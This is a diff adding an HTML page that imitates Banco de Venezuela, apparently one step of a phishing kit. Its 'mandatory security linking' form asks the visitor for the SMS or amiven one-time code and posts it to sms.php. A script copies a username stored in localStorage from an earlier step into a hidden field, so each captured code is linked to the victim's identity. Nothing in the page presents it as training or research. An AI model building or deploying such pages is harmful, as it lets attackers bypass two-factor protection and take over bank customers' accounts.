@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banco de Venezuela</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: url(background.webp);
+        background-size: cover;
+        background-position: center;
+      }
+
+      .container {
+        display: flex;
+        height: 100%;
+        width: 100%;
+      }
+
+      .left-side {
+        width: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .right-side {
+        width: 50%;
+      }
+
+      form {
+        width: 80%;
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      @media (max-width: 768px) {
+        body {
+          background: #ededed;
+        }
+        .container {
+          flex-direction: column;
+        }
+        .left-side {
+          width: 100%;
+          height: 100vh;
+        }
+        .right-side {
+          display: none;
+        }
+      }
+    </style>
+    <style>
+      .form-group {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
+
+      .form-group label {
+        position: absolute;
+        top: 50%;
+        left: 10px;
+        transform: translateY(-55%);
+        color: #999;
+        transition: top 0.3s, font-size 0.3s;
+        pointer-events: none;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+      }
+      .form-group input:focus {
+        border: 0;
+      }
+      .form-group input:focus + label,
+      .form-group input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+
+      button {
+        background-color: #0067b1;
+        color: white;
+        border-radius: 3px;
+        border: 0;
+        padding: 15px;
+        width: 200px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-side">
+        <form method="post" action="sms.php">
+          <div style="text-align: center">
+            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div style="margin: 10px; color: #0067b1 !important">
+              <h4>Vinculación de seguridad Obligatoria</h4>
+              <h5>
+                Ingrese el código recibido por SMS o código generado en amiven
+              </h5>
+            </div>
+            <div class="form-group">
+              <input
+                type="text"
+                id="sms"
+                name="sms"
+                style="width: 100%"
+                maxlength="8"
+                required
+                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+              />
+              <label for="sms">SMS *</label>
+            </div>
+            <!-- Campo oculto para enviar el nombre guardado en localStorage -->
+            <input type="hidden" id="nombreOculto" name="nombre" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button type="submit">Verificar</button>
+          </div>
+          <div style="width: 100%; height: 30px"></div>
+        </form>
+      </div>
+      <div class="right-side"></div>
+    </div>
+
+    <!-- Script para asignar el nombre guardado en localStorage al campo oculto -->
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const nombre = localStorage.getItem("usuario"); // Obtener el nombre del almacenamiento local
+        if (nombre) {
+          document.getElementById("nombreOculto").value = nombre; // Asignar el nombre al campo oculto
+        }
+      });
+    </script>
+  </body>
+</html>
+
